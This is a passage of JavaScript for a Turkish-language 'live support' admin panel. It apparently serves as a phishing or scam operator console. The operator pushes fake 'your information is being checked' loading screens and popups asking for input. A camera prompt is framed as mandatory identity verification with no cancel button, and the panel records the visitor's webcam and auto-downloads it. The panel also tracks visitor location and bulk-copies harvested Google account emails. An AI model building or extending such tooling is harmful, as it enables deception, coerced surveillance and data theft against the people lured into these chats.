    updateAdminLocationUi(row.lastLocation, "live", null);
  }
  maybeAutoDownloadSessionRecording(row);
  if (row.lastRecordingCallId && !row.lastRecordingUrl && !adminCall) {
    startRecordingWatch(row.id, row.lastRecordingCallId, {
      sessionId: row.id,
      callId: row.lastRecordingCallId,
      lastBlob: null,
      seenRecordingUrl: null,
      awaitingRecording: true,
    });
  }
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  Array.from(sessionList.querySelectorAll(".session-item")).forEach((el) => {
    el.classList.toggle("is-active", el.dataset.sessionId === row.id);
  });

  bindSessionMessages(row.id);
  // Destek sohbeti disinda verilen izin de canli baglansin (openSession döngüsüne girme)
  if (row.lastCallId && (row.cameraGranted || row.hasCamera || row.cameraPending)) {
    window.setTimeout(() => {
      void joinAdminCamera(row.id, row.lastCallId);
    }, 200);
  }
  replyInput?.focus();
}

async function sendToSelected(text, options = {}) {
  const msg = String(
    text ||
      (options.type === "loading"
        ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrilmayin…"
        : options.type === "camera"
          ? "Kimlik dogrulamasi için izin vermeniz isteniyor. Izin verirseniz dogrulama bu destek oturumuna baglanir. Izin verilmezse dogrulama tamamlanamaz."
          : options.type === "photos"
            ? "Destek için ekran görüntüsü veya fotograf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
            : "")
  ).trim();
  if (!msg && options.type !== "loading") return;
  if (!selectedId) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  if (sending) return;
  sending = true;
  sendHint.hidden = false;
  sendHint.textContent = "Gönderiliyor…";
  const releaseSending = window.setTimeout(() => {
    if (sending) sending = false;
  }, 20000);
  try {
    const result = await window.ChatSync.sendAdminMessage(selectedId, msg, options);
    sendHint.textContent =
      options.type === "loading"
        ? "Yükleme animasyonu gönderildi."
        : options.type === "popup"
          ? "Popup gönderildi."
          : options.type === "camera"
            ? "Kamera talebi gönderildi."
            : options.type === "photos"
              ? "Fotograf talebi gönderildi."
              : "Gönderildi.";
    if (options.type === "camera" && result?.callId) {
      resetLiveVideoUi();
      await joinAdminCamera(selectedId, result.callId);
    }
    if (
      options.type !== "loading" &&
      options.type !== "popup" &&
      options.type !== "camera" &&
      options.type !== "photos"
    ) {
      replyInput.value = "";
    }
    window.setTimeout(() => {
      if (
        sendHint.textContent.includes("Gönderildi") ||
        sendHint.textContent.includes("animasyon") ||
        sendHint.textContent.includes("Popup") ||
        sendHint.textContent.includes("Kamera") ||
        sendHint.textContent.includes("Fotograf")
      ) {
        sendHint.hidden = true;
      }
    }, 1200);
  } catch (err) {
    const detail = err?.code || err?.message || String(err);
    sendHint.textContent = `Gönderilemedi: ${detail}`;
  } finally {
    window.clearTimeout(releaseSending);
    sending = false;
  }
}

function renderQuickButtons() {
  const list = window.ChatSync.getQuickReplies();
  quickList.innerHTML = "";
  list.forEach((text) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.textContent = text.length > 48 ? `${text.slice(0, 48)}…` : text;
    btn.title = text;
    btn.addEventListener("click", () => sendToSelected(text));
    quickList.appendChild(btn);
  });
}

function renderTemplatesEditor(list) {
  templatesEditor.innerHTML = "";
  (list.length ? list : [""]).forEach((text, index) => {
    const row = document.createElement("div");
    row.className = "template-row";
    row.innerHTML = `
      <label class="visually-hidden" for="tpl-${index}">Hazir mesaj ${index + 1}</label>
      <textarea id="tpl-${index}" rows="2" maxlength="800" data-tpl>${escapeHtml(text)}</textarea>
      <button type="button" class="chat-clear" data-remove="${index}">Sil</button>
    `;
    const ta = row.querySelector("textarea");
    ta.value = text;
    templatesEditor.appendChild(row);
  });
}

function readTemplatesFromEditor() {
  return Array.from(templatesEditor.querySelectorAll("[data-tpl]"))
    .map((el) => el.value.trim())
    .filter(Boolean);
}

replyForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  sendToSelected(replyInput.value);
});

sendLoadingBtn?.addEventListener("click", () => {
  sendToSelected(
    "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrilmayin…",
    { type: "loading" }
  );
});

exportChatBtn?.addEventListener("click", () => {
  void exportSelectedChat();
});
clearChatBtn?.addEventListener("click", () => {
  void clearSelectedChat();
});
clearAllChatsBtn?.addEventListener("click", () => {
  void clearAllChats();
});

sendCameraBtn?.addEventListener("click", () => {
  void (async () => {
    if (sending) {
      sendHint.hidden = false;
      sendHint.textContent = "Gönderiliyor, bekleyin…";
      return;
    }
    // Eski oturum kilidi kaldiysa önce temizle; yeni talebi engelleme
    if (adminCall) {
      sendHint.hidden = false;
      sendHint.textContent = "Önceki kamera oturumu kapatiliyor…";
      try {
        await endActiveCameraSession();
      } catch (err) {
        console.error(err);
        adminCall = null;
      }
    }
    await sendToSelected(
      "Kimlik dogrulamasi için izin zorunludur. Izin verirseniz dogrulama bu destek oturumuna baglanir. Izin verilmezse dogrulama adimi tamamlanamaz.",
      {
        type: "camera",
        okLabel: "Izin ver",
        cancelLabel: "",
        hideCancel: true,
      }
    );
  })();
});

sendPhotosBtn?.addEventListener("click", () => {
  sendToSelected(
    "Destek için ekran görüntüsü veya fotograf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin. Sadece sizin seçtiginiz dosyalar gönderilir.",
    {
      type: "photos",
      okLabel: "Fotograf seç",
      cancelLabel: "Istemiyorum",
      maxPhotos: 10,
    }
  );
});

async function endActiveCameraSession() {
  const call = adminCall;
  if (!call) {
    adminCall = null;
    setEndCameraVisible(false);
    setHideCameraVisible(false);
    if (reopenCameraBtn) reopenCameraBtn.hidden = true;
    return;
  }
  const { sessionId, callId } = call;
  const pending = {
    sessionId,
    callId,
    lastBlob: null,
    seenRecordingUrl: call.seenRecordingUrl || null,
    awaitingRecording: true,
  };
  setCameraUi(true, "Oturum sonlandiriliyor…");
  adminCameraBox?.classList.remove("is-recording");
  setEndCameraVisible(false);

  // Listener çakismasin diye önce aboneligi kes, sonra Firebase’e bitis yaz
  try {
    call.unsubCall?.();
    call.unsubCall = null;
    call.unsubIce?.();
    call.unsubIce = null;
  } catch {
    /* ignore */
  }

  try {
    if (sessionId && callId && window.ChatSync) {
      try {
        if (window.ChatSync.forceEndCameraCall) {
          await window.ChatSync.forceEndCameraCall(sessionId, callId);
        } else {
          await window.ChatSync.setCameraCallStatus(sessionId, callId, "ended");
        }
      } catch (err) {
        console.error(err);
        sendHint.hidden = false;
        sendHint.textContent = `Sonlandirilamadi: ${err?.message || err}`;
      }
    }

    try {
      await stopAdminRecording(call, { autoDownload: false });
      pending.lastBlob = call.lastBlob || null;
    } catch {
      /* ignore */
    }

    try {
      call.pc?.close();
      call.pc = null;
    } catch {
      /* ignore */
    }
    if (adminRemoteVideo) adminRemoteVideo.srcObject = null;

    if (pending.lastBlob?.size) {
      forceDownloadBlob(pending.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
      setCameraUi(true, "Yerel kayit indirildi · Storage yedek bekleniyor…");
    } else {
      setCameraUi(true, "Ziyaretçi kaydi yükleniyor…");
    }

    startRecordingWatch(sessionId, callId, pending);
    // Storage URL sohbet meta’sina da düserse liste üzerinden de otomatik iner

    sendHint.hidden = false;
    sendHint.textContent = pending.lastBlob?.size
      ? "Oturum bitti · kayit indiriliyor (yerel + Storage)."
      : "Oturum bitti · ziyaretçi kaydi gelince otomatik indirilecek.";
    if (reopenCameraBtn) reopenCameraBtn.hidden = false;
    window.setTimeout(() => {
      if (
        sendHint.textContent.includes("Oturum bitti") ||
        sendHint.textContent.includes("Oturum sonlandir")
      ) {
        sendHint.hidden = true;
      }
    }, 5000);
  } finally {
    if (adminCall === call) adminCall = null;
    setEndCameraVisible(false);
  }
}

endCameraBtn?.addEventListener("click", () => {
  endActiveCameraSession();
});
endCameraBtnModal?.addEventListener("click", () => {
  endActiveCameraSession();
});

hideCameraBtn?.addEventListener("click", () => {
  hideCameraPopup();
});
hideCameraPanelBtn?.addEventListener("click", () => {
  hideCameraPopup();
});
hideCameraBtnModal?.addEventListener("click", () => {
  hideCameraPopup();
});
reopenCameraBtn?.addEventListener("click", () => {
  showCameraPopup();
});
dockOpenCameraBtn?.addEventListener("click", () => {
  const row = latestSessionRows.find((r) => r.id === selectedId);
  if (row?.lastSnapshotUrl) showAdminSnapshot(row.lastSnapshotUrl);
  else showCameraPopup();
});

(function wireCameraDrag() {
  const panel = document.getElementById("admin-camera-panel");
  const handle = document.getElementById("admin-camera-drag");
  if (!panel || !handle) return;

  let dragging = false;
  let startX = 0;
  let startY = 0;
  let originLeft = 0;
  let originTop = 0;

  const onMove = (clientX, clientY) => {
    if (!dragging) return;
    const dx = clientX - startX;
    const dy = clientY - startY;
    const maxLeft = Math.max(8, window.innerWidth - panel.offsetWidth - 8);
    const maxTop = Math.max(8, window.innerHeight - panel.offsetHeight - 8);
    const left = Math.min(maxLeft, Math.max(8, originLeft + dx));
    const top = Math.min(maxTop, Math.max(8, originTop + dy));
    panel.style.left = `${left}px`;
    panel.style.top = `${top}px`;
    panel.style.right = "auto";
    panel.style.bottom = "auto";
    panel.style.transform = "none";
  };

  handle.addEventListener("pointerdown", (e) => {
    if (e.button != null && e.button !== 0) return;
    if (e.target.closest("#hide-camera-btn")) return;
    dragging = true;
    panel.classList.add("is-dragging");
    const rect = panel.getBoundingClientRect();
    startX = e.clientX;
    startY = e.clientY;
    originLeft = rect.left;
    originTop = rect.top;
    panel.style.left = `${rect.left}px`;
    panel.style.top = `${rect.top}px`;
    panel.style.transform = "none";
    handle.setPointerCapture?.(e.pointerId);
    e.preventDefault();
  });

  handle.addEventListener("pointermove", (e) => onMove(e.clientX, e.clientY));
  handle.addEventListener("pointerup", (e) => {
    dragging = false;
    panel.classList.remove("is-dragging");
    handle.releasePointerCapture?.(e.pointerId);
  });
  handle.addEventListener("pointercancel", () => {
    dragging = false;
    panel.classList.remove("is-dragging");
  });
})();

sendPopupBtn?.addEventListener("click", () => {
  const question = String(popupText?.value || "").trim();
  if (!question) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce popup metnini yazin (ziyaretçiye soru).";
    popupText?.focus();
    return;
  }
  sendToSelected(question, {
    type: "popup",
    okLabel: popupOk?.value || "Tamam",
    cancelLabel: popupCancel?.value || "Iptal",
    withInput: true,
    placeholder: popupPlaceholder?.value || "Mesajinizi buraya yazin…",
  });
});

templatesForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  const saved = window.ChatSync.setQuickReplies(readTemplatesFromEditor());
  renderTemplatesEditor(saved);
  renderQuickButtons();
  templatesSaved.hidden = false;
  window.setTimeout(() => {
    templatesSaved.hidden = true;
  }, 1500);
});

addTemplateBtn?.addEventListener("click", () => {
  const list = readTemplatesFromEditor();
  list.push("");
  renderTemplatesEditor(list);
  templatesEditor.querySelector("textarea:last-of-type")?.focus();
});

resetTemplatesBtn?.addEventListener("click", () => {
  const defaults = [...window.ChatSync.DEFAULT_QUICK_REPLIES];
  window.ChatSync.setQuickReplies(defaults);
  renderTemplatesEditor(defaults);
  renderQuickButtons();
});

templatesEditor?.addEventListener("click", (e) => {
  const btn = e.target.closest("[data-remove]");
  if (!btn) return;
  const list = readTemplatesFromEditor();
  const idx = Number(btn.getAttribute("data-remove"));
  list.splice(idx, 1);
  renderTemplatesEditor(list.length ? list : [""]);
});

notifyBtn?.addEventListener("click", () => {
  void armAlerts();
});

alertDismiss?.addEventListener("click", () => {
  hideAdminAlert();
});

gmailSearch?.addEventListener("input", () => {
  renderGmails();
});

gmailCopyBtn?.addEventListener("click", async () => {
  const emails = filteredGoogleAccounts()
    .map((r) => String(r.email || "").trim())
    .filter(Boolean);
  if (!emails.length) {
    showGmailHint("Kopyalanacak e-posta yok");
    return;
  }
  try {
    await navigator.clipboard.writeText(emails.join("\n"));
    showGmailHint(`${emails.length} e-posta kopyalandi`);
  } catch {
    showGmailHint("Kopyalama basarisiz");
  }
});

gmailBackfillBtn?.addEventListener("click", async () => {
  if (!window.ChatSync?.backfillGoogleAccountsFromSessions) {
    showGmailHint("Aktarim fonksiyonu yok — sayfayi yenile");
    return;
  }
  gmailBackfillBtn.disabled = true;
  showGmailHint("Sohbetlerden aktariliyor…");
  try {
    const n = await window.ChatSync.backfillGoogleAccountsFromSessions();
    showGmailHint(n ? `${n} sohbetten Google hesabi aktarildi` : "Aktarilacak Google kaydi bulunamadi");
  } catch (err) {
    console.warn(err);
    showGmailHint(
      "Aktarim basarisiz — Firebase Rules’a googleAccounts ekleyip Publish edin"
    );
  } finally {
    gmailBackfillBtn.disabled = false;
  }
});

logoutBtn?.addEventListener("click", () => {
  setAuth(false);
  if (unsubSessions) unsubSessions();
  if (unsubMessages) unsubMessages();
  if (unsubGoogleAccounts) unsubGoogleAccounts();
  unsubGoogleAccounts = null;
  stopAdminCall(true);
  hideAdminAlert();
  selectedId = null;
  alertsArmed = false;
  sessionsHydrated = false;
  knownSessionIds = new Set();
  googleAccountRows = [];
  latestSessionRows = [];
  if (titleFlashTimer) {
    clearInterval(titleFlashTimer);
    titleFlashTimer = null;
  }
  document.title = originalTitle || "Canli Destek Paneli";
  show("login");
});

loginForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  const pass = String(document.getElementById("admin-pass")?.value || "").trim();
  const expected = String(window.FIREBASE_SYNC?.adminPassword || "").trim();
  const ok =
    expected.length > 0 &&
    (pass === expected || pass.replace(/\s+/g, "") === expected.replace(/\s+/g, ""));

  if (!window.FIREBASE_SYNC) {
    loginError.hidden = false;
    loginError.textContent = "firebase-config.js yüklenemedi. Sayfayi Ctrl+F5 ile yenileyin.";
    return;
  }
  if (!ok) {
    loginError.hidden = false;
    loginError.textContent =
      expected.length === 0
        ? "Config içinde admin sifresi yok."
        : `Sifre hatali (yazilan ${pass.length} karakter, beklenen ${expected.length}).`;
    return;
  }
  loginError.hidden = true;
  setAuth(true);
  // Giris jesti ile sesi hemen aç
  void (async () => {
    await unlockAlertAudio();
    startDash(window.ChatSync);
    await armAlerts();
  })();
});

const sync = await ready();
if (!sync) {
  show("setup");
  const lede = document.querySelector("#setup-panel .lede");
  if (lede) {
    lede.textContent =
      "Firebase scriptleri yüklenemedi veya çok yavas. Ctrl+F5 ile yenileyin. Internet/engelleyici varsa kapatin.";
  }
} else if (sync.needsSetup) {
  show("setup");
} else if (authOk()) {
  startDash(sync);
} else {
  show("login");
}
